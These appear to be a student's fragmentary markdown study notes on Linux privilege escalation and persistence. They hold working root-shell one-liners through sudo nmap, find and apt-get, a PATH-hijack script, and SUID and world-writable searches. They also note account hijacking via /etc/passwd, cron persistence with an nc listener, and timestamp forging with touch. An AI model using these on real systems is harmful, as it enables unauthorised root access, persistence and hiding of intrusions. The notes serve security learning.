## Sudo
```

Commands that can access the contents of other files
Commands that download files
Commands that execute other commands (i.e. editors)
Dangerous commands

If you can edit the /etc/sudoers it is priv. escalation

echo 'os.execute ("/bin/bash")' > /tmp/escape.nse
chmod +x /tmp/escape.nse
sudo nmap --script=/tmp/escape.nse

```

## SUID/GUID
```

Changes Prmissions when you run said file?

```

## Insecure Permissions 
```

CRON:
can run as root(give it our own commands to run as root)

World-writable files/directories:
/tmp -- /var/tmp?
**Could have root privileges**
find / -type f -perm /2 -o -type d -perm /2 -o 2> /dev/null

Dot '.' in PATH:
write a script that is named common command(ls) and it will run that script.

vim ls
#1/bin/bash
whoami

chmod +x ls

```

## Adding or Hijacking A user account
```

edit /etc/passwd -- /etc/shadow

```

## Boot
```



```

## CRON Persistance
```

run command as root(open a nc listener)

```

## Kernel Modules
```

Systemd, syslog, etc.
services

```

## Timestamps
```

touch -c -t 201603051015 1.txt (explicit)
touch -r 3.txt 1.txt (refrence file)

```

## Remote Logging
```

grep "IncludeConfig" /etc/rsyslog.conf

```

## DEMO
```

Sudo:
apt-get
GTFOBINS(search for apt-get)
sudo apt-get (copy & paste)
!/bin/sh

SUID/GUID:
find / -perm /4000 -ls 2> /dev/null -- SUID
find / -perm /2000 -ls 2> /dev/null -- SGID
***find***
sudo find . -exec /bin/sh -p \; -quit

World Writable Directories:
find / -type d -perm /2 2>/dev/null
(/dev/shm)(/var/tmp)(/tmp)

```

## 
```



```

## 
```



```

## 
```



```

## 
```



```

